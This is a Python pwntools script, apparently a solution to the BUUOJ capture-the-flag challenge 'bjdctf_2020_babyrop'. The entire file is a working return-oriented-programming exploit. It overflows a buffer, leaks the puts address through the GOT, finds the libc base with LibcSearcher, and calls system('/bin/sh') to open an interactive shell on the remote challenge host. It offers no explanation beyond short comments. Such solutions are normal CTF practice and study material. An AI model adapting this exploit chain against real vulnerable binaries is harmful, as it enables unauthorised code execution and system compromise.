from LibcSearcher import LibcSearcher
from pwn import *


def bjdctf_2020_babyrop(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/bjdctf_2020_babyrop'):
    print('bjdctf_2020_babyrop start')
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 28592)
    target_elf = ELF(file_name)

    puts_plt = p64(target_elf.plt['puts'])
    puts_got = p64(target_elf.got['puts'])

    vuln_ptr = p64(target_elf.symbols['vuln'])

    pop_ret_gadget = p64(0x400733)  # pop rdi ; ret
    pop2_ret_gadget = p64(0x400731)  # pop rsi ; pop r15 ; ret

    payload_1 = b'A' * 40
    # puts(*puts_got)
    payload_1 += pop_ret_gadget + puts_got + puts_plt
    # vuln()
    payload_1 += vuln_ptr

    target.sendlineafter('Pull up your sword and tell me u story!\n', payload_1)

    puts_ptr = int.from_bytes(target.recvline()[:6], 'little')
    print(hex(puts_ptr))

    searcher = LibcSearcher('puts', puts_ptr)
    libc_base = puts_ptr - searcher.dump('puts')

    system_ptr = p64(libc_base + searcher.dump('system'))
    bin_sh_ptr = p64(libc_base + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * 40
    # system('/bin/sh')
    payload_2 += pop_ret_gadget + bin_sh_ptr + system_ptr

    target.sendlineafter('Pull up your sword and tell me u story!\n', payload_2)
    target.interactive()
    print('bjdctf_2020_babyrop end')


if __name__ == '__main__':
    bjdctf_2020_babyrop()
